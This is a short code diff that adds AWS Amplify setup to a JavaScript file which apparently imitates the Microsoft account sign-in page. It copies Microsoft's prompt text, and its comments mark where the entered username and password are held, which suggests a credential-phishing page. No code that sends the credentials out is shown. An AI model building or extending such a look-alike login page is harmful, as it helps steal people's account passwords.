@@ -1,6 +1,16 @@
 /// NOTE unameInp.value is the username value
 /// The password value is pwdInp.value
 
+import { ThemeProvider } from "@aws-amplify/ui-react";
+import { Amplify } from 'aws-amplify';
+
+import awsconfig from './aws-exports';
+
+import "@aws-amplify/ui-react/styles.css";
+import { studioTheme } from "./ui-components";
+
+Amplify.configure(awsconfig);
+
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
